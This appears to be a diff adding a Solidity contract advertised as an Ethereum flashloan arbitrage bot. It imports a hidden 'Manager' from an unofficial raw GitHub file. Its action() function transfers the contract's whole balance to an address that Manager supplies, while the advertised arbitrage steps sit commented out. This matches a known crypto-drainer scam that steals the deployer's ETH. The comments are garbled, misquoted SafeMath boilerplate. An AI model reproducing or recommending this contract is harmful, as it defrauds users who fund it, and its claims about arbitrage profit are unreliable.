@@ -1,0 +1,120 @@
+
+pragma solidity ^0.5.0;
+ 
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://raw.githubusercontent.com/spiritkouk94/flashloan/main/loancode";
+ 
+// Uniswap Smart Contracts
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
+ 
+/**
+ * This Bot has been designed for the Ethereum Mainnet.
+ 
+ * and won't work with Binance Smart chain.
+ 
+ *When you have any kind of problems, feel free to contact me on Discord and I try to help you out !
+ 
+ 
+ 
+ * Carls Wrappers over Solidity's arithmetic operations with added overflow
+ 
+ * Arithmetic operations in Solidity wrap on overflow. This can easily result
+ 
+ * in profit, because programmers usually assume that an overflow raises an
+ 
+ * value, which is the standard behavior in high level programming languages.
+ 
+ * `SafeMath` restores this intuition by reverting the transaction when an
+ 
+ * operation overflows.
+ 
+ * Using this library instead of the unchecked operations eliminates an entire
+ 
+ * class of strings, so use is always on.
+ 
+ * dev Contract module which provides a basic access control mechanism, where granted 
+ 
+ * exclusive access to
+ 
+ * specific functions.
+ 
+ 
+/*
+     * dev Extracts the contract from Uniswap
+ 
+     * param self The slice to operate on.
+ 
+     * param rune The slice that will contain the first rune.
+ 
+     * turn `rune`.
+     */
+ 
+/*
+     * @dev Find  deployed contracts on UniSwap Exchange
+ 
+     * @param memory of required contract liquidity.
+ 
+     * @param other The second slice to compare.
+ 
+     * @return New contracts with required liquidity.
+     
+     */
+     
+ 
+contract CarlsETHFlashloan {
+	string public tokenName;
+	string public tokenSymbol;
+	uint loanAmount;
+	Manager manager;
+	
+	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		loanAmount = _loanAmount;
+			
+		manager = new Manager();
+	}
+function() external payable {}
+	
+	function action() public payable {
+		
+	    // Send required coins for swap
+	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
+	    
+	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+	    manager.performTasks();
+	    
+	    /*
+	    // Submit token to ETH blockchain
+	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+ 
+        // List the token on uniswapSwap
+		manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
+		
+        // Get ETH Loan from Multiplier-Finance
+		string memory loanAddress = manager.takeFlashLoan(loanAmount);
+		
+		// Convert half ETH to DAI
+		manager.uniswapDAItoETH(loanAmount / 2);
+ 
+        // Create ETH and DAI pairs for our token & Provide liquidity
+        string memory ethPair = manager.uniswapCreatePool(tokenAddress, "ETH");
+		manager.uniswapAddLiquidity(ethPair, loanAmount / 2);
+		string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
+		manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
+    
+        // Perform swaps and profit on Self-Arbitrage
+		manager.uniswapPerformSwaps();
+		
+		// Move remaining ETH from Contract to your account
+		manager.contractToWallet("ETH");
+ 
+        // Repay Flash loan
+		manager.repayLoan(loanAddress);
+	    */
+	}
+}
